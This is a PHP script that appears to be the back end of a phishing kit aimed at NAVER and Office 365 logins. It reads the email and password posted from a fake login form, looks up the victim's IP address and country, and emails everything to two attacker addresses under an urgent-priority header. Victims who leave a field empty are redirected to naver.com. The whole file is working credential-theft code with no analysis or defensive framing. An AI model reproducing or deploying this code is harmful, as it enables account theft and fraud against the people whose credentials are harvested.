<?php
session_start();
header('Access-Control-Allow-Origin: *');
// header('Content-Type: application/json; charset=utf-8');
header("Content-Type:text/html; charset=\"iso-8859-1\"\n");
header('Access-Control-Allow-Headers:*');
// $_SESSION['Pdf3'] = $_POST['pdf3'];
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details['geoplugin_countryName']));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$own = 'alisontex8@yandex.com, alisontex8@gmail.com';
$server = date("D/M/d, Y g:i a"); 
$sender = 'result@donking.net';
$domain = 'LOGS | NAVER 2023 |';
$subj = "$domain | $country";
$headers1 = "From: OFFICE365 LOGINS<$sender>\n";
$headers2 = "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers3 = "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$headers4=$headers1 . $headers2 . $headers3;
$over = 'http://drive.google.com/file/d';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $passwd = $_POST['password'];
    $login = $_POST['email'];
    $msg = "<HTML><BODY>
    <TABLE>
    <tr><td>________OffIcE LoG_________</td></tr>
    <tr><td><STRONG>EMail I.D: $login<td/></tr>
    <tr><td><STRONG>Password: $passwd</td></tr>
    <tr><td><STRONG>IP: $ip</td></tr>
    <tr><td><STRONG>Date: $server</td></tr>
    <tr><td><STRONG>country : $country</td></tr>
    <tr><td>_____cReAtEd By Abacha______</td></tr>
    </BODY>
    </HTML>";

        
    if (empty($login) || empty($passwd)) {
    header( "Location: https://naver.com" );
    }
    else {
    mail($own,$subj,$msg,$headers4);
    }
                

}

    


     



?>

